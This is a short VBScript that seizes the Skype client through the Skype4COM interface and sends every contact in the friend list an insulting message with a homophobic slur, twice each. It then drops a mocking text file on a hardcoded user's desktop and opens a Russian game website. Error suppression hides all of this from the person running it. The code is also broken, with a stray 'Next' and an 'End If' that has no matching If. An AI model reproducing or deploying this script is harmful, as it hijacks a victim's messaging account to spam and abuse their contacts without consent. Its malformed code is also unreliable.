on error resume next
set Skype = Wscript.CreateObject("Skype4COM.Skype", "Skype ")
Skype.Client.Start()
Skype.Attach()
For Each User In Skype.Friends
Skype.SendMessage User.handle,"tu esti pidar(finger)"
Skype.SendMessage User.handle,"tu esti pidar(finger)"
next 
set FSO=CreateObject("Scripting.FileSystemObject")
set file =FSO.CreateTextFile("C:\Users\Unic\Desktop\LOH.txt")
file.WriteLine("Da tu esti LOH")
file.Close
Next
Set Sh = WScript.CreateObject("WScript.Shell")
Sh.Run "http://www.voyna-plemyon.ru/", 3
End If